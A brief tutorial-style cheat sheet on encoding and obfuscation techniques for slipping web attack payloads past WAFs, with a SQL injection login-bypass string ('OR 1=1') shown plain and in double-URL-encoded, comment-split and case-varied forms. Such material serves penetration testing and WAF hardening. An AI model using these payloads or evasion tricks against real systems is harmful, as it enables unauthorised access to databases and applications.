Obfuscation & Encoding Techniques

Disguising malicious payloads to evade WAF detection.

Common Obfuscation Methods
  • URL Encoding: Double encoding (`%2527` for `'`) or mixed encoding.
  • Unicode Encoding: Using Unicode characters that decode to attack strings.
  • Hex/ASCII Encoding: `CHAR(100)` in SQLi instead of `'d'`.
  • Case Variation: `sElEcT` instead of `SELECT` to bypass case-sensitive rules.
  • Comments: Injecting SQL comments (`/*!UNION SELECT*/`) to break up keywords.
Key Takeaway

Obfuscation and encoding exploit WAF's reliance on specific signatures, allowing payloads to pass undetected if the WAF doesn't normalize input correctly.

SQLi Obfuscation Examples

Original:

' OR 1=1-- -

Double URL Encoding:

%2527%20OR%201=1--%20-

SQL Comments:

' /*!OR*/ 1=1-- -

Case Variation:

' oR 1=1-- -
